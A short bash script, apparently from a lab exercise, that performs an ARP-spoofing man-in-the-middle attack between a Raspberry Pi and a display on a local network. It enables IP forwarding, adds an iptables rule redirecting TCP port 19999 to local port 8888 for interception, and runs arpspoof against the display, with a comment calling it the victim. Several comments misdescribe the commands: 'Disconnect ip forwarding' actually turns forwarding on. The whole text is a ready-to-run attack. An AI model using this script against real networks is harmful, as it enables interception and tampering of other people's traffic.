#!/bin/bash
PI_ADDRESS="172.26.87.132"
DISPLAY_ADRESS="172.26.9.140"
 
# Disconnect ip forwarding
sudo sysctl -w net.ipv4.ip_forward=1
 
# Run ARP spoofing to disconnect the Raspberry Pi and the display
sudo iptables -t nat -A PREROUTING -p tcp --dport 19999 -j REDIRECT --to-ports 8888
sudo arpspoof -i eth0 -t $DISPLAY_ADRESS $PI_ADDRESS
 
# Check the vitim PC
# arp -a